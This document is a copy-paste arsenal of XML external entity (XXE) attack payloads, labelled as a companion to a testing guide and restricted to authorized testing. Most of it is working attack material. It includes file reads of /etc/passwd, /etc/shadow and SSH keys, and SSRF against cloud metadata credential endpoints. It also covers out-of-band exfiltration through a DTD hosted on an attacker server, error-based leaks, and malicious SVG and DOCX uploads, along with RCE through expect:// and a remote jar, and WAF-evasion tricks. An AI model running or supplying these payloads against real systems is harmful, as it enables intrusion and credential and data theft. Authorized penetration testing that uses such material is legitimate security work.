# XXE Arsenal — Copy-Paste Payloads (file read · SSRF · blind OOB · error · XInclude · uploads · bypasses)

> Companion to `XXE_TESTING_GUIDE.md`. Authorized testing only. Replace `YOUR-OOB-HOST` with your Collaborator/
> Interactsh/`poc/oob_server.py` host. **Read a benign file first** (`/etc/hostname`), bound your reads, clean up uploads/OOB.

---

## 1. Detection (safe, benign — do these first)
```xml
<!-- is XML parsed? break it: unclosed tag should error -->
<?xml version="1.0"?><r>unclosed
```
```xml
<!-- does it expand + reflect INTERNAL entities? (no external fetch) -->
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY test "x8bit-marker"> ]>
<r>&test;</r>
```
`x8bit-marker` in the response → in-band (§3). Parsed but not reflected → blind (§8). DOCTYPE error → XInclude (§10)/hardened.

## 2. In-band file read (entity value reflected)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<r>&xxe;</r>
```
```xml
<!-- Windows -->
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<!-- other high-value files -->
file:///etc/hostname          file:///etc/shadow (root)     file:///proc/self/environ
file:///proc/self/cwd/index.php   file:///var/www/html/.env  file:///root/.ssh/id_rsa
file:///c:/inetpub/wwwroot/web.config    file:///c:/windows/system32/drivers/etc/hosts
```
Place `&xxe;` in whatever data node the app reflects (e.g. `<username>&xxe;</username>`).

## 3. Read source / files with < & (base64 via php://filter — PHP)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"> ]>
<r>&xxe;</r>
```
Base64-decode the reflected/exfiltrated blob → raw source. Also: `resource=index.php`, `.../wp-config.php`, `.../config/database.yml`.

## 4. XXE → SSRF (internal + cloud metadata)
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<r>&xxe;</r>
```
```
AWS     http://169.254.169.254/latest/meta-data/  (…/iam/security-credentials/<role>)
GCP     http://metadata.google.internal/computeMetadata/v1/  (needs Metadata-Flavor header — often not settable via XXE)
Azure   http://169.254.169.254/metadata/instance?api-version=2021-02-01  (needs Metadata:true header)
internal http://127.0.0.1:8080/   http://localhost/admin   http://internal-svc:PORT/
```
Full SSRF bypasses / IMDSv2 / gopher → `../SSRF/`.

## 5. Blind OOB exfiltration (parameter entities + external DTD) ★
**Submit to the target:**
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://YOUR-OOB-HOST/evil.dtd"> %ext; ]>
<r>trigger</r>
```
**`evil.dtd` hosted on YOUR-OOB-HOST** (HTTP exfil):
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-OOB-HOST/log?x=%file;'>">
%eval;
%exfil;
```
File contents arrive in your server's access log (`?x=<contents>`). For files with newlines, use `php://filter` base64 in `%file` (single-line, URL-safe).
```xml
<!-- FTP exfil (Java; when HTTP egress is filtered) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://YOUR-OOB-HOST:2121/%file;'>">
%eval; %exfil;
```
```
DNS-only confirm (egress-restricted): point %ext at http://<unique>.YOUR-INTERACTSH  → a DNS hit proves blind XXE.
```

## 6. Error-based exfiltration (no outbound needed if egress is dead but errors show)
```xml
<!-- external evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```
File contents appear inside the "failed to open file:///nonexistent/<CONTENTS>" parser error.
```xml
<!-- fully local: reuse an on-box DTD, override its param entity (no attacker server) -->
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  &#x25;eval; &#x25;err;
'>
%local_dtd;
]>
<r></r>
```
Enumerate a present DTD first (common: yelp `docbookx.dtd`; distro/Java DTDs). See `poc/` notes for finding one.

## 7. XInclude (no DOCTYPE control — you only own a sub-node)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
```xml
<!-- source via php filter -->
<xi:include parse="text" href="php://filter/convert.base64-encode/resource=/var/www/html/index.php"/>
<!-- SSRF via XInclude -->
<xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
```
Inject just the element the server embeds into its own XML.

## 8. File-upload payloads
**SVG** (image/avatar upload, SVG→PNG):
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">
  <text x="10" y="30">&xxe;</text>
</svg>
```
**SVG blind-OOB:**
```xml
<!DOCTYPE svg [ <!ENTITY % ext SYSTEM "http://YOUR-OOB-HOST/evil.dtd"> %ext; ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>
```
**DOCX/XLSX/PPTX (OOXML = zip of XML):** inject into `word/document.xml` (or `[Content_Types].xml` / `xl/workbook.xml`):
```
unzip doc.docx -d d/ ; edit d/word/document.xml → add DOCTYPE + blind-OOB (as §5) at top ; (cd d && zip -r ../evil.docx .)
```
`poc/make_ooxml_xxe.py doc.docx http://YOUR-OOB-HOST/evil.dtd` builds it. Upload to resume/import/preview features.
**Other XML-backed:** GPX/KML, plist, RSS/Atom, SAML metadata — same DOCTYPE/param-entity injection.

## 9. Content-type switch (JSON endpoint → XML)
```
POST /api/v1/thing HTTP/1.1
Content-Type: application/xml        <-- was application/json

<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
```
Also try `text/xml`, `application/*+xml`.

## 10. RCE
```xml
<!ENTITY xxe SYSTEM "expect://id">                          <!-- PHP with expect ext -->
<!ENTITY xxe SYSTEM "jar:http://YOUR-HOST/evil.jar!/x">     <!-- Java jar: fetch+extract -->
```
Prove with a benign command (`id`/`whoami`) and stop.

## 11. WAF / filter bypasses
```
DOCTYPE/ENTITY blocked   → XInclude (§7) or content-type switch (§9)
SYSTEM blocked           → PUBLIC:  <!ENTITY xxe PUBLIC "-//x//x" "file:///etc/passwd">
byte-signature WAF       → submit XML as UTF-16 (iconv -t UTF-16BE) or add a UTF-16/UTF-7 BOM
protocol blocked         → swap file:// ↔ php://filter ↔ http:// ↔ ftp:// ↔ jar: ↔ netdoc:
outbound blocked         → error-based (§6) + local-DTD reuse
nested to break sigs      → parameter entities / split the DOCTYPE across entities
```
```bash
# UTF-16 encode a payload to dodge a body WAF (parser still reads it):
iconv -f UTF-8 -t UTF-16BE payload.xml > payload_utf16.xml
```

## 12. Tooling cheat
```
Burp (Repeater + Collaborator)   manual + OOB catch (best)
Interactsh (interactsh-client)   OOB HTTP/DNS/FTP catcher
XXEinjector (Ruby)               automates OOB/error file read + brute
oxml_xxe                         builds XXE-laced Office/SVG/OOXML files
poc/ (this kit)                  oob_server.py (DTD+exfil catcher) · xxe_probe.py · make_ooxml_xxe.py · make_svg_xxe.py
defusedxml / libxml_disable_entity_loader  ← the FIXES (for the report's remediation)
```
